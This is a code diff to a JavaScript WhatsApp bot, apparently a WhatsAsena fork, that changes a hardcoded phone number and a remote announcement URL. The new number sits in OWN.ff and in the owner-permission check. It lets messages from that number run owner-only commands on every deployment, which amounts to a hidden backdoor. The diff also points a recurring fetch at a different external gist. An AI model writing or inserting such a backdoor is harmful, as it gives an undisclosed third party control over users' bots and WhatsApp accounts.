@@ -47,7 +47,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '905511384572,0' }
+var OWN = { ff: '94764746599,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -84,7 +84,7 @@ async function whatsAsena () {
     setInterval(async () => { 
         var getGMTh = new Date().getHours()
         var getGMTm = new Date().getMinutes()
-        await axios.get('https://gist.githubusercontent.com/phaticusthiccy/d0d1855bd0098d773759b4f3345bd292/raw/').then(async (ann) => {
+        await axios.get('https://gist.githubusercontent.com/Aqua-Snake/45d8f9633a2e24d25921bb976f35bb44/raw/').then(async (ann) => {
             const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
             if (infotr !== '' && config.LANG == 'TR') {
                 while (getGMTh == 19 && getGMTm == 1) { 
@@ -616,7 +616,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94764746599,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
